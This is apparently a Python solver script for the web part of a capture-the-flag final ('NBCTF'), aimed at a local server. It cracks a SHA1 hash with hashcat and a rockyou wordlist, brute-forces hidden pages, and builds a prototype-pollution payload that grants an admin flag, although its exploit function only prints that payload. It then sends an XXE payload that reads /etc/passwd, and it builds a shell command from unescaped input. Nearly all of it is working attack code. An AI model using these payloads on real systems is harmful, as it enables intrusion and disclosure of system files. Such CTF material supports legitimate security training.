import random
import requests
import re
import time
import os
import hashlib
import subprocess


url = 'http://localhost:4444'

print("\033[H\033[J")
print("Solver challenge finale NBCTF")
print("Web part")
print("\n")
print('=====================================')
print('Step 1 : Find hidden endpoint')
print('=====================================')

endpoint = '/futureonline'

response = requests.get(url + endpoint)
print('Testing endpoint : ' + url + endpoint)
print("\033[92m + Response " + str(response.status_code) + "\033[0m")

print("Following redirection ...")
# new endpoint is /futureonline/ so grep it in response.text
print("\033[92m + New endpoint " + re.search(r'(?<=href=").*?(?=")', response.text).group() + "\033[0m")

print("\n")
print('=====================================')
print('Step 2 : Crack hash in URL')
print('=====================================')

# decode the task after "?task=" 
print("Decoding task : " + re.search(r'(?<=task=).*?(?=")', response.text).group())
print("Removing the last character ...")
hash = re.search(r'(?<=task=).*?(?=")', response.text).group()[:-1]
os.system("echo " + hash + " > task.txt && hashcat -m 100 -a 0 task.txt ~/Téléchargements/rockyou.txt --show | grep " + hash)
# password is string after ':' in hashcat output
password = re.search(r'(?<=:).*', os.popen("hashcat -m 100 -a 0 task.txt ~/Téléchargements/rockyou.txt --show | grep " + hash).read()).group()
print("\033[92m + Password found : " + password + "\033[0m")


print("\n")
print('=====================================')
print('Step 3 : Retrieve all others pages')
print("=====================================")
url = 'http://localhost:4444/futureonline?task='
for i in range(100):
    hashed = hashlib.sha1(str(i).encode('utf-8')).hexdigest() + 'g'
    response = requests.get(url + hashed)
    if 'Not Found' not in response.text:
        print("\033[92m + Found page " + url + hashed + "({i})\033[0m".format(i=i))
        print("Description : " + re.search(r'(?<=<p>).*?(?=</p>)', response.text).group())
        print("Status : " + re.search(r'(?<=<p>Status: ).*?(?=</p>)', response.text).group())
        print("\n")

print("\n")
print('=====================================')
print('Step 4 : Exploiting Prototype Pollution')
print("=====================================")

print("Exploiting Prototype Pollution on /FeedBackEndpointTest ...")
response = requests.get('http://localhost:4444/FeedBackEndpointTest')
print("GET /FeedBackEndpointTest")
print("\033[92m + Response " + str(response.status_code) + "\033[0m")
print("\n")
print("POST /FeedBackEndpointTest")
response = requests.post('http://localhost:4444/FeedBackEndpointTest')
print("\033[92m + Response " + str(response.status_code) + "\033[0m")

print("\n")

payload = {
        "Object": {
            "prototype": {
                "__proto__": {
                    "SuperAdminForSuperWebSite__": True
                }
            }
        
    }
}   

def exploit(host, payload):
    url = host + '/FeedBackEndpointTest'
    print("Exploit => " + url + ' ' + str(payload))

exploit('http://localhost:4444', payload)
response = requests.get('http://localhost:4444/FeedBackEndpointTest')
print("GET /FeedBackEndpointTest")
if "Forbidden" not in response.text:
    print("\033[92m + Exploit successfull\033[0m")


print("\n")
print('=====================================')
print('Step 5 : Exploiting XXE')
print("=====================================")

url = "http://localhost:4444"
endpoint = "/process"
url = url + endpoint


xml_payload = '''
    <?xml version = "1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]>
    <contact><name>a</name><subject>a</subject><mail>&xxe;</mail><message>a</message></contact>
'''

print("Exploit => " + url + ' ')
print("Payload => " + xml_payload)

import requests

headers = {
    'Host': 'localhost:4444',
    'sec-ch-ua': '"Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',
    'Content-Type': 'text/xml',
    'Accept': '*/*',
    'Origin': 'http://localhost:4444',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'http://localhost:4444/FeedBackEndpointTest',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection': 'close',
}

data = '<?xml version = "1.0"?>\r\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]>\r\n<contact><name>a</name><subject>a</subject><mail>&xxe;</mail><message>a</message></contact>\r\n'

response = requests.post('http://localhost:4444/process', headers=headers, data=data, verify=False)
if "root" in response.text:
    print("\033[92m + Exploit successfull\033[0m")
    print(response.text.splitlines()[0:5])

